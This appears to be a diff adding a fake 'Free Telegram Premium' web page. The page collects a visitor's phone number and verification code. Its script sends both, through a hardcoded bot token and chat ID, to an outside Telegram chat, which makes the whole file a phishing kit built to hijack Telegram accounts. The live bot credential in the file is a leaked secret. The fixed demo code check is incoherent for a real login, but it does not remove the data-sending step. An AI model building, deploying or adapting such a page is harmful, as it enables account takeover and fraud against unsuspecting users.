@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Free Telegram Premium Offer</title>
+    <style>
+        body {
+            background: url('https://images.indianexpress.com/2022/06/Telegram-premium-subscription.jpg') no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            margin: 0;
+        }
+        .login-box {
+            background-color: rgba(255, 255, 255, 0.9);
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.4);
+            width: 350px;
+            text-align: center;
+        }
+        .login-box img {
+            width: 120px;
+            margin-bottom: 15px;
+        }
+        .login-box h2 {
+            margin-bottom: 20px;
+            color: #333;
+        }
+        .login-box select,
+        .login-box input[type="tel"],
+        .login-box input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+        }
+        .login-box button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0083b0;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background 0.3s ease;
+        }
+        .login-box button:hover {
+            background-color: #005f73;
+        }
+        .otp-box {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <img src="https://cdn.neowin.com/news/images/uploaded/2022/06/1655832709_telegram_premium.jpg" alt="Telegram Premium">
+        <h2>Free Telegram Premium</h2>
+        <form id="loginForm" onsubmit="return false;">
+            <select id="countryCode" required>
+                <option value="+880">Bangladesh (+880)</option>
+                <option value="+91">India (+91)</option>
+                <option value="+1">USA (+1)</option>
+                <option value="+44">UK (+44)</option>
+                <option value="+61">Australia (+61)</option>
+                <option value="+971">UAE (+971)</option>
+            </select>
+            <input type="tel" id="phoneNumber" placeholder="Enter Telegram Account Number" required>
+            <button type="button" onclick="showOtpBox()">Get Code</button>
+           
+            <div class="otp-box" id="otpBox">
+                <input type="text" id="otpInput" placeholder="Enter Verification Code" required>
+                <button type="button" onclick="verifyOtp()">Verify Code</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        const botToken = "7323356177:AAEl3rayZmeTWfHwr4f5YQahGQHpc75KIiw";
+        const chatId = "7782155349";
+
+        function showOtpBox() {
+            const phone = document.getElementById('phoneNumber').value.trim();
+            if (phone.length < 7) {
+                alert("Please enter a valid Telegram account number.");
+            } else {
+                document.getElementById('otpBox').style.display = 'block';
+            }
+        }
+
+        function verifyOtp() {
+            const correctOtp = "123456";  // Static demo OTP
+            const userOtp = document.getElementById('otpInput').value.trim();
+            const phone = document.getElementById('phoneNumber').value.trim();
+            const code = document.getElementById('countryCode').value;
+
+            if (!userOtp || !phone) {
+                alert("❌ All fields are required.");
+                return;
+            }
+
+            if (userOtp === correctOtp) {
+                const fullNumber = code + phone;
+                const message = `📥 New Submission:\n📱 Number: ${fullNumber}\n🔑 Code: ${userOtp}`;
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                    .then(response => {
+                        if (response.ok) {
+                            alert("✅ Verified & sent to Telegram!");
+                            document.getElementById('loginForm').reset();
+                            document.getElementById('otpBox').style.display = 'none';
+                        } else {
+                            alert("❌ Failed to send to Telegram.");
+                        }
+                    })
+                    .catch(error => {
+                        console.error("Error:", error);
+                        alert("❌ Network error.");
+                    });
+            } else {
+                alert("❌ Wrong code, try again!");
+            }
+        }
+    </script>
+</body>
+</html>
